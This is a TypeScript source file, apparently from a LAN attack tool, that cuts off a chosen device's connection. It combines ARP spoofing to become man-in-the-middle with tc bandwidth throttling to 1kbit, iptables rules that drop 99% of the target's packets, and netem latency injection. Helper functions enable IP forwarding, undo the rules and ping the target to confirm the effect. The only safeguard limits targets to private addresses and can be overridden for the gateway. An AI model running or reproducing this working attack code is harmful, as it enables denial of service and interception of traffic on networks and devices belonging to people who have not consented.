import { exec } from './exec';
import { startArpSpoof, stopArpSpoof, getMacAddress } from './arp';
import type { AttackConfig, AttackRules } from '../types';

/**
 * Apply extreme bandwidth limitation (QUAD KILL)
 * 
 * Attack Vector:
 * 0. ARP Spoofing - Make us man-in-the-middle
 * 1. TC (Traffic Control) - Bandwidth throttle to 1KB/s
 * 2. iptables - 99% packet drop
 * 3. TC netem - 5000ms latency
 */
export async function killTarget(config: AttackConfig): Promise<AttackRules> {
  const { targetIp, interface: iface, gateway } = config;
  const rules: AttackRules = {
    tc: [],
    iptables: [],
    netem: [],
    arp: { targetIp, gatewayIp: gateway, active: true },
  };

  try {
    // === PHASE 0: ARP Spoofing (CRITICAL!) ===
    console.log('  Setting up ARP spoofing (MITM)...');
    
    await startArpSpoof({
      targetIp,
      gatewayIp: gateway,
      interface: iface,
    });
    
    // === PHASE 1: Bandwidth Throttle (1KB/s) ===
    console.log('  Applying bandwidth throttle (1KB/s)...');
    
    // Delete existing qdisc if any
    await exec(`tc qdisc del dev ${iface} root 2>/dev/null`, { ignoreError: true });
    
    // Create root qdisc with HTB
    await exec(`tc qdisc add dev ${iface} root handle 1: htb default 30`);
    rules.tc.push(`tc qdisc del dev ${iface} root`);

    // Create class with 1kbit rate (basically dead)
    await exec(`tc class add dev ${iface} parent 1: classid 1:1 htb rate 1kbit ceil 1kbit`);
    
    // Create default class for other traffic
    await exec(`tc class add dev ${iface} parent 1: classid 1:30 htb rate 1gbit ceil 1gbit`);
    
    // Filter to target specific IP (both directions)
    await exec(
      `tc filter add dev ${iface} protocol ip parent 1:0 prio 1 u32 match ip dst ${targetIp} flowid 1:1`
    );
    await exec(
      `tc filter add dev ${iface} protocol ip parent 1:0 prio 1 u32 match ip src ${targetIp} flowid 1:1`
    );

    // === PHASE 2: Packet Drop (99%) ===
    console.log('  Applying packet drop (99%)...');
    
    // Drop packets TO target
    await exec(
      `iptables -I FORWARD -d ${targetIp} -m statistic --mode random --probability 0.99 -j DROP`
    );
    rules.iptables.push(`iptables -D FORWARD -d ${targetIp} -m statistic --mode random --probability 0.99 -j DROP`);

    // Drop packets FROM target
    await exec(
      `iptables -I FORWARD -s ${targetIp} -m statistic --mode random --probability 0.99 -j DROP`
    );
    rules.iptables.push(`iptables -D FORWARD -s ${targetIp} -m statistic --mode random --probability 0.99 -j DROP`);

    // === PHASE 3: Latency Injection (5000ms) ===
    console.log('  Applying latency injection (5000ms)...');
    
    // Add massive delay with variation and packet loss
    await exec(
      `tc qdisc add dev ${iface} parent 1:1 handle 10: netem delay 5000ms 2000ms loss 10% duplicate 2%`
    );
    rules.netem.push(`tc qdisc del dev ${iface} parent 1:1 handle 10:`);

    return rules;

  } catch (error) {
    // Rollback on error
    await cleanupRules(rules);
    throw new Error(`Failed to apply attack: ${error}`);
  }
}

/**
 * Stop all attacks and cleanup rules
 */
export async function stopAttack(iface: string, rules?: AttackRules): Promise<void> {
  try {
    if (rules) {
      // Stop ARP spoofing first (most critical!)
      if (rules.arp && rules.arp.active) {
        await stopArpSpoof(rules.arp.targetIp, rules.arp.gatewayIp, iface);
      }
      
      // Remove other rules
      await cleanupRules(rules);
    } else {
      // Nuclear cleanup - remove everything
      await exec(`tc qdisc del dev ${iface} root 2>/dev/null`, { ignoreError: true });
      await exec(`iptables -F FORWARD 2>/dev/null`, { ignoreError: true });
    }
  } catch (error) {
    throw new Error(`Cleanup failed: ${error}`);
  }
}

/**
 * Cleanup specific rules
 */
async function cleanupRules(rules: AttackRules): Promise<void> {
  // Remove TC rules
  for (const cmd of rules.tc) {
    await exec(cmd, { ignoreError: true });
  }

  // Remove iptables rules
  for (const cmd of rules.iptables) {
    await exec(cmd, { ignoreError: true });
  }

  // Remove netem rules
  for (const cmd of rules.netem) {
    await exec(cmd, { ignoreError: true });
  }
}

/**
 * Check if IP forwarding is enabled (required for attack)
 */
export async function checkIpForwarding(): Promise<boolean> {
  try {
    const { stdout } = await exec('sysctl net.ipv4.ip_forward');
    return stdout.includes('= 1');
  } catch {
    return false;
  }
}

/**
 * Enable IP forwarding (required for MITM)
 */
export async function enableIpForwarding(): Promise<void> {
  try {
    await exec('sysctl -w net.ipv4.ip_forward=1');
  } catch (error) {
    throw new Error('Failed to enable IP forwarding');
  }
}

/**
 * Validate target IP is safe to attack
 */
export function validateTarget(targetIp: string, networkInfo: { gateway: string; ip: string }): void {
  // Check if private IP
  if (!isPrivateIP(targetIp)) {
    throw new Error('Target must be a private IP address (10.x, 172.16-31.x, 192.168.x)');
  }

  // Cannot target own IP
  if (targetIp === networkInfo.ip) {
    throw new Error('Cannot target own IP address');
  }

  // Warning for gateway (but allow with environment variable override)
  if (targetIp === networkInfo.gateway) {
    // Check for explicit override
    if (process.env.NETHER_ALLOW_GATEWAY !== 'yes') {
      console.log('\n⚠️  WARNING: Targeting gateway will kill YOUR connection too!');
      console.log('⚠️  To proceed anyway, set: export NETHER_ALLOW_GATEWAY=yes\n');
      throw new Error('Gateway targeting blocked for safety. Use NETHER_ALLOW_GATEWAY=yes to override.');
    }
    
    // Allow with warning
    console.log('\n⚠️⚠️⚠️  DANGER: Targeting gateway - your connection will DIE! ⚠️⚠️⚠️\n');
  }
}

/**
 * Check if IP is private range
 */
function isPrivateIP(ip: string): boolean {
  const parts = ip.split('.').map(Number);
  const [first = 0, second = 0] = parts;

  if (parts.length !== 4) return false;

  // 10.0.0.0/8
  if (first === 10) return true;

  // 172.16.0.0/12
  if (first === 172 && second >= 16 && second <= 31) return true;

  // 192.168.0.0/16
  if (first === 192 && second === 168) return true;

  // 127.0.0.0/8 (localhost)
  if (first === 127) return true;

  return false;
}

/**
 * Monitor target connectivity
 */
export async function monitorTarget(ip: string): Promise<{ alive: boolean; latency?: number }> {
  try {
    const start = Date.now();
    const { stdout, success } = await exec(`ping -c 1 -W 2 ${ip}`, { ignoreError: true });
    const latency = Date.now() - start;

    if (!success) {
      return { alive: false };
    }

    // Parse ping time
    const match = stdout.match(/time=([\d.]+)/);
    const pingTime = match ? parseFloat(match[1] || '0') : latency;

    return {
      alive: true,
      latency: pingTime,
    };
  } catch {
    return { alive: false };
  }
}